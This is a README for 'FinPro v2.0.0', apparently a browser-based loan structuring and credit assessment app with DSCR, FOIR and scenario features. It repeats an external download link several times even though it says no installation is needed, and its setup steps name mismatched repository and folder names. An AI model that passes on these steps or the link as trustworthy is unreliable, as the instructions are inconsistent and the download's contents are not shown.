# FinPro v2.0.0 - credit assessment and loan structuring web app 2026

> **FinPro is a browser-based credit assessment and loan structuring app that supports financial analysis, DSCR and FOIR calculations, and multi-year scenario review in version 2.0.0.**

[![Platform](https://img.shields.io/badge/Platform-browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2.0.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/mattwgadams5656/finpro-loan-structuring?style=flat-square)](https://github.com/mattwgadams5656/finpro-loan-structuring)

---

<p align="center">
  <a href="https://mattwgadams5656.github.io/finpro-loan-structuring/">
    <img src="https://img.shields.io/badge/Download-FinPro%20Latest-brightgreen?style=for-the-badge" alt="Download FinPro">
  </a>
</p>

> **[Download FinPro v2.0.0](https://mattwgadams5656.github.io/finpro-loan-structuring/)**

---

[Download Latest Build](https://mattwgadams5656.github.io/finpro-loan-structuring/)

---

## What FinPro Does

FinPro provides a browser-based workspace for consistent borrower evaluation and loan planning. Instead of relying on disconnected spreadsheets and handwritten notes, users can combine credit review, borrowing-capacity calculations, and scenario comparisons in one interface.

The application works with both companies and individual borrowers. It can process financial information covering several years, expose changes in important metrics, and produce reports from the completed analysis. This makes it useful for examining repayment strength, comparing loan structures, and testing how financial results respond over time.

---

## Core Capabilities

- Create assessments for company or individual borrowers
- Upload financial statements covering multiple years
- Estimate loan capacity using DSCR calculations
- Estimate loan capacity using FOIR calculations
- Explore loan structures with adjustable inputs
- Test assumptions through stress and scenario analysis
- Compare financial trends across multiple years
- Produce reports based on analyzed information

---

## Getting Started

Because FinPro runs as a web app, setup does not require a traditional installation process.

1. Clone or download the repository:
   - `git clone https://github.com/mattwgadams5656/finpro-loan-structuring.git
2. Move into the application directory:
   - `cd finpro-credit-assessment`
3. Serve the project locally with your preferred local server, or use a static hosting environment to open it in a browser.

To use the published version, open the latest build link and begin the assessment there.

---

## Using FinPro

A standard assessment can be completed as follows:

1. Start FinPro in a modern web browser.
2. Select either company or individual borrower analysis.
3. Add the applicable financial statements. Include several years when that information is available.
4. Examine the DSCR and FOIR results to assess borrowing capacity.
5. Change the loan structure values to review alternative financing arrangements.
6. Apply scenario or stress analysis to compare outcomes under different assumptions.
7. Create a report after completing the review.

---

## Browser Storage and Configuration

FinPro uses browser `localStorage` to retain application state.

The configuration may follow this pattern:

    {
      "borrowerType": "company",
      "analysisMode": "scenario",
      "statementYears": 3,
      "lastOpenTab": "loan-structure"
    }

Removing browser storage can clear saved preferences and recent session information. Upload-related options and analysis settings should be controlled through the application interface.

---

## Requirements

- A current modern web browser
- JavaScript enabled in the browser
- Browser local storage support for session preferences
- Adequate storage for uploaded financial statements and generated reports
- Internet connectivity when using hosted download or deployment links

---

## Frequently Asked Questions

**How can I find the newest version?**  
Open the latest build link to check the currently published release.

**Can FinPro review several years of financial data?**  
Yes. Multi-year statement uploads and year-over-year trend analysis are supported.

**Are individual borrowers supported as well as businesses?**  
Yes. FinPro provides analysis options for both companies and individuals.

**Where does FinPro keep configuration settings?**  
The app saves settings in the browser's `localStorage`.

**What should I review if the output seems incorrect?**  
Verify the uploaded statements, make sure the correct borrower type is selected, and check the values used for DSCR, FOIR, and scenario analysis.

---

## License

FinPro is distributed under the GNU GPL v3.0. See [LICENSE](LICENSE) for details.
